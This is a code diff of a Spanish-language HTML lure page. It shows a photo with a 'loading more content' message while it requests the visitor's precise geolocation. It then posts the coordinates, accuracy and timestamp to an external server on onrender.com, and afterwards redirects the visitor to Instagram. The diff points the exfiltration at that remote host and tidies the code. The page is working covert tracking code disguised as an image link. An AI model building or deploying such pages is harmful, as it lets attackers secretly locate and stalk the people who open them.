@@ -31,13 +31,12 @@
 </head>
 <body>
     <div class="container">
-        <!-- Imagen atractiva -->
         <img src="https://i.imgur.com/fJkXnFf.jpg" alt="Foto">
         <p class="loader">Cargando contenido adicional...</p>
     </div>
 
     <script>
-        function getLocation() {
+        async function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError, { 
                     enableHighAccuracy: true, 
@@ -48,31 +47,33 @@
             }
         }
 
-        function showPosition(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var precision = position.coords.accuracy;
-            var fecha = new Date().toLocaleString();
+        async function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const precision = position.coords.accuracy;
+            const fecha = new Date().toLocaleString();
 
-            var data = new URLSearchParams();
-            data.append('lat', lat);
-            data.append('lon', lon);
-            data.append('precision', precision);
-            data.append('fecha', fecha);
+            const formData = new FormData();
+            formData.append('lat', lat);
+            formData.append('lon', lon);
+            formData.append('precision', precision);
+            formData.append('fecha', fecha);
 
-            // Ahora apunta a la ruta de Flask
-            fetch('/guardar_y_notificar', {
-                method: 'POST',
-                body: data
-            }).then(() => {
+            try {
+                // URL completa de tu servidor en Render
+                await fetch('https://imageo-mm44.onrender.com/guardar_y_notificar', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error("Error enviando datos:", error);
+            } finally {
                 redirigir();
-            }).catch(() => {
-                redirigir();
-            });
+            }
         }
 
         function showError(error) {
-            console.log("Error de ubicación: " + error.message);
+            console.log("Error capturando ubicación: " + error.message);
             redirigir();
         }
 
@@ -80,7 +81,7 @@
             window.location.href = "https://www.instagram.com/";
         }
 
-        // Iniciar captura tras 2 segundos
+        // Iniciar proceso tras 2 segundos
         setTimeout(getLocation, 2000);
     </script>
 </body>
